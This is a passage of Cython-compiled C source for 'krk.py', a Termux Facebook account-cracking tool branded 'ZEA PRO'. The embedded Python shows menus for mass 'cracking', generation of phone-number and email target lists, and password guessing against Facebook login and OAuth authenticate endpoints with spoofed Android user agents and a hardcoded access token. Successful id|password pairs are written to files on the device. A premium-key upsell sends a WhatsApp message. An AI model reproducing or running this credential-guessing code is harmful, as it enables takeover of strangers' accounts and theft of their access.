 *                         print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)
 *                         clear()
 *                         print('\033[1;31m First Read Note : ')             # <<<<<<<<<<<<<<
 *                         print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
 *                         linex()
 */
  __pyx_tuple__37 = PyTuple_Pack(1, __pyx_kp_s_1_31m_First_Read_Note); if (unlikely(!__pyx_tuple__37)) __PYX_ERR(0, 205, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__37);
  __Pyx_GIVEREF(__pyx_tuple__37);

  /* "krk.py":206
 *                         clear()
 *                         print('\033[1;31m First Read Note : ')
 *                         print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")             # <<<<<<<<<<<<<<
 *                         linex()
 *                         print(' \033[1;31mYour Key Not Registered\033[1;37m')
 */
  __pyx_tuple__38 = PyTuple_Pack(1, __pyx_kp_s_1_36m_We_Not_Responsible_if_fac); if (unlikely(!__pyx_tuple__38)) __PYX_ERR(0, 206, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__38);
  __Pyx_GIVEREF(__pyx_tuple__38);

  /* "krk.py":208
 *                         print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
 *                         linex()
 *                         print(' \033[1;31mYour Key Not Registered\033[1;37m')             # <<<<<<<<<<<<<<
 *                         print(f" \033[1;37mYour Key : {fkeyx}")
 *                         linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
 */
  __pyx_tuple__39 = PyTuple_Pack(1, __pyx_kp_s_1_31mYour_Key_Not_Registered_1); if (unlikely(!__pyx_tuple__39)) __PYX_ERR(0, 208, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__39);
  __Pyx_GIVEREF(__pyx_tuple__39);

  /* "krk.py":210
 *                         print(' \033[1;31mYour Key Not Registered\033[1;37m')
 *                         print(f" \033[1;37mYour Key : {fkeyx}")
 *                         linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')             # <<<<<<<<<<<<<<
 *                         linex()
 *                         input(" Choose Option : ")
 */
  __pyx_tuple__40 = PyTuple_Pack(1, __pyx_kp_s_Tools_Facebook_Cloning); if (unlikely(!__pyx_tuple__40)) __PYX_ERR(0, 210, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__40);
  __Pyx_GIVEREF(__pyx_tuple__40);
  __pyx_tuple__41 = PyTuple_Pack(1, __pyx_kp_s_Massage_Your_Key_Not_Registered); if (unlikely(!__pyx_tuple__41)) __PYX_ERR(0, 210, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__41);
  __Pyx_GIVEREF(__pyx_tuple__41);
  __pyx_tuple__42 = PyTuple_Pack(1, __pyx_kp_s_Status_1_91mTrail_1_37m_1_31m_1); if (unlikely(!__pyx_tuple__42)) __PYX_ERR(0, 210, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__42);
  __Pyx_GIVEREF(__pyx_tuple__42);
  __pyx_tuple__43 = PyTuple_Pack(1, __pyx_kp_s_File_crack_Create_ids_file_Publ); if (unlikely(!__pyx_tuple__43)) __PYX_ERR(0, 210, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__43);
  __Pyx_GIVEREF(__pyx_tuple__43);

  /* "krk.py":212
 *                         linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
 *                         linex()
 *                         input(" Choose Option : ")             # <<<<<<<<<<<<<<
 *                         linex()
 *                         print(" Your Subscription Date Expire")
 */
  __pyx_tuple__44 = PyTuple_Pack(1, __pyx_kp_s_Choose_Option); if (unlikely(!__pyx_tuple__44)) __PYX_ERR(0, 212, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__44);
  __Pyx_GIVEREF(__pyx_tuple__44);

  /* "krk.py":214
 *                         input(" Choose Option : ")
 *                         linex()
 *                         print(" Your Subscription Date Expire")             # <<<<<<<<<<<<<<
 *                         linex()
 *                         url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
 */
  __pyx_tuple__45 = PyTuple_Pack(1, __pyx_kp_s_Your_Subscription_Date_Expire); if (unlikely(!__pyx_tuple__45)) __PYX_ERR(0, 214, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__45);
  __Pyx_GIVEREF(__pyx_tuple__45);

  /* "krk.py":217
 *                         linex()
 *                         url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
 *                         name = input(" Enter your Name : ")             # <<<<<<<<<<<<<<
 *                         linex()
 *                         tks = ("Hi ZEA Sir, I Need To Buy Your Paid ZEA PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
 */
  __pyx_tuple__46 = PyTuple_Pack(1, __pyx_kp_s_Enter_your_Name); if (unlikely(!__pyx_tuple__46)) __PYX_ERR(0, 217, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__46);
  __Pyx_GIVEREF(__pyx_tuple__46);

  /* "krk.py":221
 *                         tks = ("Hi ZEA Sir, I Need To Buy Your Paid ZEA PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
 *                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
 *                         print(' Run :  python ZEA.py')             # <<<<<<<<<<<<<<
 *                         linex()
 *                         exit()
 */
  __pyx_tuple__47 = PyTuple_Pack(1, __pyx_kp_s_Run_python_ZEA_py); if (unlikely(!__pyx_tuple__47)) __PYX_ERR(0, 221, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__47);
  __Pyx_GIVEREF(__pyx_tuple__47);

  /* "krk.py":227
 *                 exit()
 *         except requests.exceptions.ConnectionError:
 *                 print('\n No internet connection ...')             # <<<<<<<<<<<<<<
 *                 exit()
 * def pak():
 */
  __pyx_tuple__48 = PyTuple_Pack(1, __pyx_kp_s_No_internet_connection); if (unlikely(!__pyx_tuple__48)) __PYX_ERR(0, 227, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__48);
  __Pyx_GIVEREF(__pyx_tuple__48);

  /* "krk.py":232
 *                 user=[]
 *                 clear()
 *                 print('\033[1;33m Code example: 077,078,070,079,076')             # <<<<<<<<<<<<<<
 *                 code = input('\033[1;37m put code: ')
 *                 try:
 */
  __pyx_tuple__49 = PyTuple_Pack(1, __pyx_kp_s_1_33m_Code_example_077_078_070); if (unlikely(!__pyx_tuple__49)) __PYX_ERR(0, 232, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__49);
  __Pyx_GIVEREF(__pyx_tuple__49);

  /* "krk.py":233
 *                 clear()
 *                 print('\033[1;33m Code example: 077,078,070,079,076')
 *                 code = input('\033[1;37m put code: ')             # <<<<<<<<<<<<<<
 *                 try:
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
 */
  __pyx_tuple__50 = PyTuple_Pack(1, __pyx_kp_s_1_37m_put_code); if (unlikely(!__pyx_tuple__50)) __PYX_ERR(0, 233, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__50);
  __Pyx_GIVEREF(__pyx_tuple__50);

  /* "krk.py":235
 *                 code = input('\033[1;37m put code: ')
 *                 try:
 *                         limit = int(input('\033[1;33m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))             # <<<<<<<<<<<<<<
 *                 except ValueError:
 *                         limit = 5000
 */
  __pyx_tuple__51 = PyTuple_Pack(1, __pyx_kp_s_1_33m_example_2000_3000_5000_10); if (unlikely(!__pyx_tuple__51)) __PYX_ERR(0, 235, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__51);
  __Pyx_GIVEREF(__pyx_tuple__51);

  /* "krk.py":262
 *                 user=[]
 *                 clear()
 *                 print('\033[1;33m Code example: 0306,0315,0335,0345')             # <<<<<<<<<<<<<<
 *                 code = input('\033[1;37m put code: ')
 *                 try:
 */
  __pyx_tuple__53 = PyTuple_Pack(1, __pyx_kp_s_1_33m_Code_example_0306_0315_03); if (unlikely(!__pyx_tuple__53)) __PYX_ERR(0, 262, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__53);
  __Pyx_GIVEREF(__pyx_tuple__53);

  /* "krk.py":292
 *                 os.system('rm -rf .re.txt')
 *                 clear()
 *                 print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 first = input(' Put first name: ')
 */
  __pyx_tuple__54 = PyTuple_Pack(1, __pyx_kp_s_1_37m_example_muhammad_ali_sajj); if (unlikely(!__pyx_tuple__54)) __PYX_ERR(0, 292, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__54);
  __Pyx_GIVEREF(__pyx_tuple__54);

  /* "krk.py":294
 *                 print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
 *                 linex()
 *                 first = input(' Put first name: ')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
 */
  __pyx_tuple__55 = PyTuple_Pack(1, __pyx_kp_s_Put_first_name); if (unlikely(!__pyx_tuple__55)) __PYX_ERR(0, 294, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__55);
  __Pyx_GIVEREF(__pyx_tuple__55);

  /* "krk.py":296
 *                 first = input(' Put first name: ')
 *                 linex()
 *                 print('\033[1;37m example: khan, ahmad, ali \033[1;97m')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 last = input(' Put last name: ')
 */
  __pyx_tuple__56 = PyTuple_Pack(1, __pyx_kp_s_1_37m_example_khan_ahmad_ali_1); if (unlikely(!__pyx_tuple__56)) __PYX_ERR(0, 296, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__56);
  __Pyx_GIVEREF(__pyx_tuple__56);

  /* "krk.py":298
 *                 print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
 *                 linex()
 *                 last = input(' Put last name: ')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 print(' Example: @gmail.com , @yahoo.com etc...')
 */
  __pyx_tuple__57 = PyTuple_Pack(1, __pyx_kp_s_Put_last_name); if (unlikely(!__pyx_tuple__57)) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__57);
  __Pyx_GIVEREF(__pyx_tuple__57);

  /* "krk.py":300
 *                 last = input(' Put last name: ')
 *                 linex()
 *                 print(' Example: @gmail.com , @yahoo.com etc...')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 domain = input(' domain: ')
 */
  __pyx_tuple__58 = PyTuple_Pack(1, __pyx_kp_s_Example_gmail_com_yahoo_com_etc); if (unlikely(!__pyx_tuple__58)) __PYX_ERR(0, 300, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__58);
  __Pyx_GIVEREF(__pyx_tuple__58);

  /* "krk.py":302
 *                 print(' Example: @gmail.com , @yahoo.com etc...')
 *                 linex()
 *                 domain = input(' domain: ')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 try:
 */
  __pyx_tuple__59 = PyTuple_Pack(1, __pyx_kp_s_domain); if (unlikely(!__pyx_tuple__59)) __PYX_ERR(0, 302, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__59);
  __Pyx_GIVEREF(__pyx_tuple__59);

  /* "krk.py":305
 *                 linex()
 *                 try:
 *                         limit=int(input(' Put limit: '))             # <<<<<<<<<<<<<<
 *                 except ValueError:
 *                         limit = 5000
 */
  __pyx_tuple__60 = PyTuple_Pack(1, __pyx_kp_s_Put_limit); if (unlikely(!__pyx_tuple__60)) __PYX_ERR(0, 305, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__60);
  __Pyx_GIVEREF(__pyx_tuple__60);

  /* "krk.py":309
 *                         limit = 5000
 *                 linex()
 *                 print(' Getting gmails...')             # <<<<<<<<<<<<<<
 *                 lists = ['3','4']
 *                 for xd in range(limit):
 */
  __pyx_tuple__61 = PyTuple_Pack(1, __pyx_kp_s_Getting_gmails); if (unlikely(!__pyx_tuple__61)) __PYX_ERR(0, 309, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__61);
  __Pyx_GIVEREF(__pyx_tuple__61);

  /* "krk.py":315
 *                         if '3' in lchoice:
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(3))
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')             # <<<<<<<<<<<<<<
 *                         else:
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
 */
  __pyx_tuple__62 = PyTuple_Pack(2, __pyx_kp_s_re_txt, __pyx_n_s_a); if (unlikely(!__pyx_tuple__62)) __PYX_ERR(0, 315, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__62);
  __Pyx_GIVEREF(__pyx_tuple__62);

  /* "krk.py":319
 *                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         fo = open('.re.txt', 'r').read().splitlines()             # <<<<<<<<<<<<<<
 *                 with tred(max_workers=30) as Sabir:
 *                         total = str(len(fo))
 */
  __pyx_tuple__64 = PyTuple_Pack(2, __pyx_kp_s_re_txt, __pyx_n_s_r); if (unlikely(!__pyx_tuple__64)) __PYX_ERR(0, 319, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__64);
  __Pyx_GIVEREF(__pyx_tuple__64);

  /* "krk.py":324
 *                         clear()
 *                         print(' Total account : \033[1;32m'+total)
 *                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")             # <<<<<<<<<<<<<<
 *                         linex()
 *                         for user in fo:
 */
  __pyx_tuple__65 = PyTuple_Pack(1, __pyx_kp_s_1_37m_38_5_208mUse_flight_mode); if (unlikely(!__pyx_tuple__65)) __PYX_ERR(0, 324, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__65);
  __Pyx_GIVEREF(__pyx_tuple__65);

  /* "krk.py":362
 *                         getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 *                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 *                         complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)             # <<<<<<<<<<<<<<
 *                         Sabir=session.cookies.get_dict().keys()
 *                         if "c_user" in Sabir:
 */
  __pyx_tuple__66 = PyTuple_Pack(1, __pyx_kp_s_https_p_facebook_com_login_devic_2); if (unlikely(!__pyx_tuple__66)) __PYX_ERR(0, 362, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__66);
  __Pyx_GIVEREF(__pyx_tuple__66);

  /* "krk.py":366
 *                         if "c_user" in Sabir:
 *                                 print('\r\r\033[1;32m [ZEA-OK] %s | %s'%(ids,pas))
 *                                 open('/sdcard/ZEA-OK.txt', 'a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                 oks.append(ids)
 *                                 break
 */
  __pyx_tuple__67 = PyTuple_Pack(2, __pyx_kp_s_sdcard_ZEA_OK_txt, __pyx_n_s_a); if (unlikely(!__pyx_tuple__67)) __PYX_ERR(0, 366, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__67);
  __Pyx_GIVEREF(__pyx_tuple__67);

  /* "krk.py":372
 *                                 if 'y' in pcp:
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-CP.txt', 'a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                         cps.append(ids)
 *                                         break
 */
  __pyx_tuple__69 = PyTuple_Pack(2, __pyx_kp_s_sdcard_ZEA_CP_txt, __pyx_n_s_a); if (unlikely(!__pyx_tuple__69)) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__69);
  __Pyx_GIVEREF(__pyx_tuple__69);

  /* "krk.py":394
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'             # <<<<<<<<<<<<<<
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']
 */
  __pyx_tuple__70 = PyTuple_Pack(2, __pyx_int_111, __pyx_int_999); if (unlikely(!__pyx_tuple__70)) __PYX_ERR(0, 394, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__70);
  __Pyx_GIVEREF(__pyx_tuple__70);
  __pyx_tuple__71 = PyTuple_Pack(2, __pyx_int_11, __pyx_int_99); if (unlikely(!__pyx_tuple__71)) __PYX_ERR(0, 394, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__71);
  __Pyx_GIVEREF(__pyx_tuple__71);

  /* "krk.py":395
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))             # <<<<<<<<<<<<<<
 *                         android_version = device['android_version']
 *                         model = device['model']
 */
  __pyx_tuple__73 = PyTuple_Pack(2, __pyx_int_111111111, __pyx_int_999999999); if (unlikely(!__pyx_tuple__73)) __PYX_ERR(0, 395, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__73);
  __Pyx_GIVEREF(__pyx_tuple__73);

  /* "krk.py":411
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'             # <<<<<<<<<<<<<<
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 */
  __pyx_tuple__74 = PyTuple_Pack(2, __pyx_int_0, __pyx_int_999999999); if (unlikely(!__pyx_tuple__74)) __PYX_ERR(0, 411, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__74);
  __Pyx_GIVEREF(__pyx_tuple__74);

  /* "krk.py":451
 *                                 'Authorization':f'OAuth {accessToken}',
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),             # <<<<<<<<<<<<<<
 *                                 'X-FB-Net-HNI': str(random.randint(11111, 99999)),
 *                                 'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
 */
  __pyx_tuple__78 = PyTuple_Pack(2, __pyx_float_2e7, __pyx_float_3e7); if (unlikely(!__pyx_tuple__78)) __PYX_ERR(0, 451, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__78);
  __Pyx_GIVEREF(__pyx_tuple__78);

  /* "krk.py":452
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
 *                                 'X-FB-Net-HNI': str(random.randint(11111, 99999)),             # <<<<<<<<<<<<<<
 *                                 'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
 *                                 'X-FB-Connection-Type':'unknown',
 */
  __pyx_tuple__79 = PyTuple_Pack(2, __pyx_int_11111, __pyx_int_99999); if (unlikely(!__pyx_tuple__79)) __PYX_ERR(0, 452, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__79);
  __Pyx_GIVEREF(__pyx_tuple__79);

  /* "krk.py":657
 *                                 else:
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+str(uid)+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                         oks.append(str(uid))
 *                                         break
 */
  __pyx_tuple__80 = PyTuple_Pack(2, __pyx_kp_s_sdcard_ZEA_R_OK_txt, __pyx_n_s_a); if (unlikely(!__pyx_tuple__80)) __PYX_ERR(0, 657, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__80);
  __Pyx_GIVEREF(__pyx_tuple__80);

  /* "krk.py":668
 *                                 else:
 *                                         print('\r\r\x1b[1;36m [ZEA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                         cps.append(str(ids))
 *                                         break
 */
  __pyx_tuple__81 = PyTuple_Pack(2, __pyx_kp_s_sdcard_ZEA_R_CP_txt, __pyx_n_s_a); if (unlikely(!__pyx_tuple__81)) __PYX_ERR(0, 668, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__81);
  __Pyx_GIVEREF(__pyx_tuple__81);

  /* "krk.py":3
 * from os import path
 * import os,base64,zlib,pip,urllib
 * os.system('xdg-open https://facebook.com/groups/351076900316263/')             # <<<<<<<<<<<<<<
 * print('\n\033[1;37m install modules...\n It will take some seconds...')
 * 
 */
  __pyx_tuple__82 = PyTuple_Pack(1, __pyx_kp_s_xdg_open_https_facebook_com_grou); if (unlikely(!__pyx_tuple__82)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__82);
  __Pyx_GIVEREF(__pyx_tuple__82);

  /* "krk.py":4
 * import os,base64,zlib,pip,urllib
 * os.system('xdg-open https://facebook.com/groups/351076900316263/')
 * print('\n\033[1;37m install modules...\n It will take some seconds...')             # <<<<<<<<<<<<<<
 * 
 * try:
 */
  __pyx_tuple__83 = PyTuple_Pack(1, __pyx_kp_s_1_37m_install_modules_It_will_t); if (unlikely(!__pyx_tuple__83)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__83);
  __Pyx_GIVEREF(__pyx_tuple__83);

  /* "krk.py":11
 *         from concurrent.futures import ThreadPoolExecutor as tred
 * except ModuleNotFoundError:
 *         print('\n Installing missing modules ...')             # <<<<<<<<<<<<<<
 *         os.system('pip install requests futures==2 > /dev/null')
 *         os.system('python AKING.py')
 */
  __pyx_tuple__84 = PyTuple_Pack(1, __pyx_kp_s_Installing_missing_modules); if (unlikely(!__pyx_tuple__84)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__84);
  __Pyx_GIVEREF(__pyx_tuple__84);

  /* "krk.py":12
 * except ModuleNotFoundError:
 *         print('\n Installing missing modules ...')
 *         os.system('pip install requests futures==2 > /dev/null')             # <<<<<<<<<<<<<<
 *         os.system('python AKING.py')
 * except:pass
 */
  __pyx_tuple__85 = PyTuple_Pack(1, __pyx_kp_s_pip_install_requests_futures_2_d); if (unlikely(!__pyx_tuple__85)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__85);
  __Pyx_GIVEREF(__pyx_tuple__85);

  /* "krk.py":13
 *         print('\n Installing missing modules ...')
 *         os.system('pip install requests futures==2 > /dev/null')
 *         os.system('python AKING.py')             # <<<<<<<<<<<<<<
 * except:pass
 * 
 */
  __pyx_tuple__86 = PyTuple_Pack(1, __pyx_kp_s_python_AKING_py); if (unlikely(!__pyx_tuple__86)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__86);
  __Pyx_GIVEREF(__pyx_tuple__86);

  /* "krk.py":16
 * except:pass
 * 
 * fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')             # <<<<<<<<<<<<<<
 * gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU',